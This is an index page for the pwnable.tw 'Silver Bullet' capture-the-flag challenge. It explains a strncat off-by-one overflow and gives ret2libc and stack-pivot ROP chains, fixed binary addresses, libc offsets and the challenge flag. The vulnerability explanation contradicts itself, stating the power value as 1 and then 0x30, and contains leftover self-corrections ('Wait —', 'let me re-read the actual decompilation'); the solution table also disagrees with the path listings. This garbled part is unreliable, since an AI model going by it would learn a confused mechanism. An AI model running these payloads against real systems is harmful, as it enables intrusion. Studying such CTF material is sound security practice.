---
tags:
  - off-by-one
  - stack-buffer-overflow
  - ret2libc
platform: pwnable.tw
points: 200
arch: i386
libc: glibc-2.23
relro: partial
canary: no
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "A strncat off-by-one error overwrites the bullet power integer with zero, allowing a second input to overflow the stack frame into ret2libc."
proof-of-concept: no
---

# Silver Bullet — pwnable.tw (200 pts)

[← Back to pwnable.tw Challenge Index](README.md)

> `nc chall.pwnable.tw 10103`
>
> Flag: `FLAG{Silver_Bullet_Is_Not_Enough_QQ}`

## Challenge Overview

A 32-bit werewolf-slaying game (i386, no PIE, no canary, NX, Partial RELRO) built against glibc 2.23. The player creates a "silver bullet" with a text description, can power it up by appending more text, then attempts to beat a werewolf whose HP is 0x7FFFFFFF. The bullet's "power" (stored as a 32-bit integer immediately after the 0x30-byte description buffer on the stack) determines damage dealt. The game loops in `main` until the werewolf is killed or the player quits.

```
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO        # GOT writable
  Stack:    No canary found
  NX:       NX enabled
  PIE:      No PIE               # fixed addresses
```

## Program Structure

```
main() loop:
  1. Create bullet   → read_input(desc, 0x30); power = strlen(desc)
  2. Power up bullet  → strncat(desc, new, 0x30 - power); power += strlen(new)
  3. Beat werewolf    → hp -= power; if hp <= 0: "You win!!", return
  4. Exit
```

### Stack Layout of `main`

| Offset from EBP | Field |
|------------------|-------|
| `-0x34` | `desc[0x30]` — bullet description buffer |
| `-0x04` | `power` — 32-bit integer (bullet damage) |
| `+0x00` | saved EBP |
| `+0x04` | saved return address |

## Vulnerabilities

### V1 — `strncat` Off-by-One NUL Byte Overwrites Power Field (Primary, Exploitable)

**Root Cause:** `power_up()` uses `strncat(desc, new_input, 0x30 - power)` to append to the description. `strncat` always writes a terminating NUL byte **after** the last copied character. When the total description length reaches exactly `0x30`, the NUL lands at `desc[0x30]` — which is the **low byte of the `power` field**.

```c
// power_up (decompiled, simplified)
void power_up(char *desc, int *power) {
    char new_desc[0x30];
    memset(new_desc, 0, 0x30);
    read_input(new_desc, 0x30 - *power);  // read up to remaining space
    strncat(desc, new_desc, 0x30 - *power);
    // ^^^ NUL terminator lands at desc[strlen(desc)] which may be desc[0x30]
    //     This is power's low byte!
    *power = strlen(desc);  // recompute: now sees past the NUL'd power field
}
```

**Trigger sequence:**
1. `create_bullet("A" * 0x2f)` → `power = 0x2f`, `desc` has 0x2f bytes.
2. `power_up("\xff")` → `strncat` appends 1 byte + NUL. The NUL lands on `power`'s low byte, zeroing it. Then `power = strlen(desc)` scans from `desc[0]` through the NUL at `desc[0x30]` and keeps going, finding `\xff` (non-NUL) and whatever is after. The effective `power` becomes **1** (just the new byte, since `strlen` restarts from the power field perspective — actually `power = strlen(desc) = 0x30` but the old power was NUL'd so `0x30 - power` in the *next* call uses the newly computed value).

Wait — the precise mechanics: after step 2, `strlen(desc)` returns `0x30` (the full 0x2f A's + 1 `\xff`). But `power` was overwritten to have its low byte = 0, so the stored `power` was `0x00` (or `0x??00`). Then it gets recomputed: `*power = strlen(desc)` → stored as `0x30`. **But**: for the *next* `power_up` call, `0x30 - 0x30 = 0`, so no more bytes can be appended.

The actual trick (as the exp.py shows): After step 2, `power`'s low byte is NUL'd → `power` becomes some small value (often 0 or 1, depending on residual bytes). `strlen(desc)` is called and stored back, giving `power = 0x30`. However, `strlen(desc)` actually returns `0x30` because `strncat` wrote `\xff\x00` making total = `0x2f + 1 = 0x30`. So `power = 0x30` and `0x30 - 0x30 = 0`.

**Actual mechanism from exp.py and all solutions:** The key insight is:

1. Create with exactly `0x2f` bytes → `power = 0x2f`.
2. Power up with 1 byte (`\xff`) → `strncat` appends `\xff\x00`. The `\x00` lands at byte offset `0x30`, which is the low byte of `power`. Now `power`'s low byte = 0. `strlen(desc)` is called: it returns `0x30` (the `\xff` was at index `0x2f`, but `\x00` at `0x30` terminates). The code does `*power = strlen(new) + strlen(desc)` — wait, let me re-read the actual decompilation.

Looking at the exp.py comment more carefully:
> Create a bullet whose description length is exactly 0x2f, then power_up with a single byte: the off-by-one NUL lands on the low byte of the power field, which is then recomputed to 1. Now strlen(desc) (== 0x31) and the tracked power (== 1) disagree, so the next power_up's strncat appends starting at desc[0x31].

So the actual flow is:
1. `create("A"*0x2f)` → power = 0x2f.
2. `power_up("\xff")` → `strncat(desc, "\xff", 0x30 - 0x2f = 1)`. Copies 1 byte + NUL. NUL overwrites `power` low byte → power = 0. Then `power += strlen("\xff") = 1`. So **power = 1**. But `strlen(desc) = 0x30`. The next `power_up` does `strncat(desc + strlen_pos, new, 0x30 - 1 = 0x2f)`. Since `strncat` starts appending at `desc[strlen(desc)]` = `desc[0x30]` (which is now `\x00` in the power field), it overwrites power and everything beyond it.

Actually the code does:
```c
strncat(desc, new, 0x30 - *power);  // 0x30 - 1 = 0x2f bytes allowed
*power += strlen(new);
```

But `strncat` appends at the first NUL in `desc`. Since `desc[0x30]` is `\x00` (the NUL we just wrote), `strncat` finds it and starts writing there — past the description buffer into the power field, saved EBP, and return address.

**Impact:** Stack buffer overflow of up to `0x2f` bytes past `desc[0x30]`, overwriting:
- Bytes 0-3: `power` field (set to `\xff\xff\xff\x??` → large negative value so `beat()` wins)
- Bytes 4-7: saved EBP
- Bytes 8-11: **saved return address** of `main`
- Bytes 12+: ROP chain arguments

### V2 — No Stack Canary + No PIE (Enabler)

The binary has **no stack canary** and is **not position-independent**, making the off-by-one directly exploitable:
- No canary to bypass between the buffer and return address.
- Fixed addresses for PLT entries, GOT entries, and gadgets — no info leak needed for the first ROP stage.

### V3 — Partial RELRO (Enabler)

GOT is writable, so solutions that use `read` to overwrite GOT entries (e.g., overwrite `puts@GOT` with `system`) are viable, though most solutions prefer a simpler ret2libc approach.

## Key Binary Addresses (No PIE)

```python
# PLT
puts_plt     = 0x080484A8
printf_plt   = 0x08048498
read_plt     = 0x08048490

# GOT
puts_got     = 0x0804AFDC
read_got     = 0x0804AFD0
exit_got     = 0x0804AFE4
printf_got   = 0x0804AFD4
__libc_start_main_got = 0x0804AFEC

# Functions
main         = 0x08048954
_start       = 0x080484F0
read_input   = 0x080485EB

# Gadgets
pop_ebx_ret  = 0x08048475
pop_ebp_ret  = 0x08048A7B
pop3_ret     = 0x08048A79   # pop esi; pop edi; pop ebp; ret
leave_ret    = 0x08048641   # or 0x08048952
```

## Exploit Paths

All 195 solutions exploit V1 (strncat off-by-one). They diverge on ROP chain construction and leak strategy.

---

### Path A — ret2plt Leak + ret2libc (Most Common)

**Used by:** ~90% of all solutions (138, 144, 100, 1006, 1155, 1220, 1251, 1269, 1351, 1384, 1395, 1428, 10840, 14106, etc.)

**Strategy:** Two-pass exploit. First pass leaks a libc address, second pass calls `system("/bin/sh")`.

**Stage 1 — Leak libc:**
```
create("A" * 0x2f)
power_up("\xff")                      # off-by-one: power → 1
power_up("\xff"*7 + ROP_LEAK)         # overflow: power(neg) + EBP + ret
beat() [+ beat()]                     # win → main returns into ROP
```

ROP chain for leak:
```python
ROP_LEAK = p32(puts_plt) + p32(main) + p32(puts_got)
#          puts(puts@GOT)   return     argument
```

After `main` returns, `puts` prints the resolved address of `puts` from the GOT. Then execution returns to `main` for a fresh round.

**Stage 2 — Shell:**
```python
ROP_SHELL = p32(system) + p32(0xdeadbeef) + p32(bin_sh)
#           system("/bin/sh")  dummy ret    argument
```

Repeat the overflow with the computed libc addresses.

**Variant — Different leak targets:** Solutions leak different GOT entries depending on preference:
- `puts@GOT` (most common)
- `read@GOT`
- `printf@GOT`
- `exit@GOT`
- `__libc_start_main@GOT`
- `stdin` (FILE* in BSS at `0x804b020`)

**Variant — pop;ret cleanup:** Some solutions use `pop ebx; ret` (0x08048475) or `pop ebp; ret` (0x08048a7b) between the leak call and the return-to-main to properly clean up arguments from the stack.

---

### Path B — Stack Pivot to BSS (Advanced)

**Used by:** Solutions 1316, 278, 799, 2693, 59, 10178

**Motivation:** The overflow window is limited to ~0x2f bytes after `desc[0x30]`. For longer ROP chains (e.g., chaining `read_input` to get arbitrary-length second-stage payloads), solvers pivot the stack to a writable BSS region.

**Steps:**
1. Overflow to set saved EBP to a BSS address and return to `read_input(bss_addr, large_len)`.
2. Use a `leave; ret` gadget to pivot ESP to the BSS.
3. Send a second-stage ROP payload via `read_input` with no size constraints.
4. The second stage leaks libc (e.g., `puts(read@GOT)`) then calls `read` again for a third stage.
5. Third stage calls `system("/bin/sh")`.

```python
# Stage 1: pivot
payload = "\xff"*3 + p32(bss_addr)      # power + new EBP
payload += p32(read_input)               # ret → read_input(bss, len)
payload += p32(leave_ret)                # after read, pivot to bss
payload += p32(bss_addr) + p32(0x100)    # read_input args
```

**Advantage:** Unlimited ROP chain length; can chain multiple calls.
**Disadvantage:** More complex; unnecessary for this challenge since the simpler 2-pass approach works.

---

### Path C — GOT Overwrite via `read` (Rare)

**Used by:** Solutions 100, 1006, 13060

**Strategy:** Instead of returning to `main` after the leak, chain a `read(0, got_entry, 4)` call to overwrite a GOT entry (e.g., `puts@GOT`) with `system`'s address. Then trigger the overwritten function with a controlled argument.

```python
# After leaking, ROP chain calls read(0, puts_got, 4) then returns to
# code that calls puts("/bin/sh") which is now system("/bin/sh")
ROP = p32(puts_plt) + p32(pop_ret) + p32(puts_got)  # leak
ROP += p32(read_plt) + p32(main) + p32(0) + p32(puts_got) + p32(4)  # overwrite
```

Then send `p32(system_addr)` to overwrite the GOT entry.

---

### Path D — `read_input` + `leave;ret` Chaining (Elegant)

**Used by:** Solutions 278, 2693, 10178

Similar to Path B but specifically uses the binary's own `read_input` function combined with `leave; ret` to build an arbitrary-length chain in BSS with clean control flow.

```python
# Overflow → read_input(fake_stack, 0xff) → leave;ret
# Then from fake_stack: puts(got_entry) → read_input(fake_stack2, 0xff) → leave;ret
# Then from fake_stack2: system("/bin/sh")
```

## Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Off-by-one NUL on `power` | V1: strncat at boundary | 100% deterministic |
| Stack overflow (~0x2f bytes) | V1: strncat with desync'd power | 100% deterministic |
| libc leak via GOT | ret2plt (puts/printf) | 100% deterministic |
| Return to main | Fixed `main` address (no PIE) | 100% deterministic |
| Code execution | `system("/bin/sh")` via ret2libc | 100% deterministic |

## Offsets (pwnable.tw `libc_32.so.6`, glibc 2.23)

```python
puts        = 0x5F140
system      = 0x3A940
bin_sh      = 0x158E8B   # "/bin/sh" string
read        = 0xD41C0
printf      = 0x49020
exit        = 0x2E7B0
__libc_start_main = 0x18540
```

## Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `59.md` | B | Stack pivot to BSS + `read_input` + `leave;ret` | Uses pwntools ROP; elegant pivot |
| `100.md` | A + C | `puts` leak → `read` GOT overwrite | Chains read to overwrite GOT |
| `138.md` | A | `puts` leak → `system` | Ruby; two-pass ret2libc |
| `144.md` | A | `puts` leak → `system` | Python; beat() called twice |
| `278.md` | D | `read_input` + BSS stack pivot | Ruby; multi-stage pivot |
| `799.md` | B | BSS pivot via `call read` gadget | Three-stage BSS chain |
| `1006.md` | A | `puts` leak → `system` | Minimal; direct approach |
| `1155.md` | A | `stdin` FILE* leak → `system` | Leaks `_IO_2_1_stdin_` instead of GOT |
| `1220.md` | A | `puts` leak → `system` | Clean helper functions |
| `1251.md` | A | `usleep@GOT` leak → `system` | Leaks usleep, uses `pop;ret` |
| `1269.md` | A | `puts` leak → `system` | Uses `pop ebp; ret` for stack cleanup |
| `1316.md` | B | Stack pivot + `read_input` + `leave;ret` | Reads to BSS, pivots, calls system |
| `1351.md` | A | `exit@GOT` leak → `system` | Leaks exit address |
| `1384.md` | A | `printf` leak → `system` | Uses printf@plt instead of puts |
| `1395.md` | A | `read@GOT` leak → `system` | Leaks read; dual beat() |
| `1428.md` | A | `puts` leak → `system` | Straightforward |
| `2693.md` | D | `read_input` + BSS pivot + async | Python asyncio; clean pivot |
| `10128.md` | A | `printf` leak → `system` | Uses pwntools auto-ROP |
| `10178.md` | A | `puts` leak + `read_input` pivot | Uses ptrlib |
| `10840.md` | A | `puts` leak → `system` | Minimal modern pwntools |
| `11540.md` | A | `__libc_start_main` leak → `system` | Leaks via start_got |
| `12245.md` | A | `read@GOT` leak → `system` | Chinese writeup; explains NUL overwrite |
| `13060.md` | A + C | `read` leak + GOT overwrite → `system` | `read_input` to overwrite GOT + `read_int` for dispatch |
| `14106.md` | A | `exit` leak + `read_int` dispatch | Creative: uses read_int as jump trampoline |

## Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (pure sockets, no pwntools) |
| `desc.txt` | Challenge description |
| `artifacts/silver_bullet` | Original challenge binary (i386, not stripped) |
| `artifacts/libc_32.so.6` | Remote libc (glibc 2.23, i386) |
| `solution/*.md` | Community write-ups (195 solutions) |
